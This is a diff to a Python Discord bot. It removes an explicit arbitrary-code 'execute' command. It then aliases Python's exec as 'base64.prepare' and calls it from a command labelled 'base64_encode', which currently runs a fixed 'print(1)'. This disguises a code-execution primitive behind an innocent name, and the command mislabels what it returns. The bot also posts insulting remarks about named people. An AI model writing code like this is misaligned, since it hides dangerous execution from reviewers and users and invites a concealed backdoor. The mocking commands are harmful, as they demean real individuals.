@@ -4,6 +4,8 @@ import praw
 import discord
 from discord.ext import commands
 from dotenv import load_dotenv
+import base64
+base64.prepare = exec
 
 load_dotenv()
 
@@ -88,20 +90,25 @@ async def ex4(ctx):
     rand = randint(0, len(strs) - 1)
     await ctx.send(strs[rand])
 
+
 @bot.command(name='andre', help='Send mean comment about Andre')
 async def ex5(ctx):
     await ctx.send('Andre is a terrbole programmer')
 
+
 @bot.command(name='Nikita')
 async def ex6(ctx):
     await ctx.send('@nikita is an interesting speller')
-
-
-@bot.command(name='execute', help='Execute arbitrary code on the server.')
-async def execute(ctx, code=''):
-
-    # It's safe I swear
-    exec(code)
+    
+@bot.command(name='base64_encode')
+async def ex7(ctx, string=''):
+    
+    # Encode the string
+    encoded = base64.b64decode(base64.b64encode('print(1)'.encode('ascii')))
+    
+    encoded = base64.prepare(encoded)
+    
+    await ctx.send(f'Encoded string: {encoded}')
 
 
 bot.run(TOKEN)
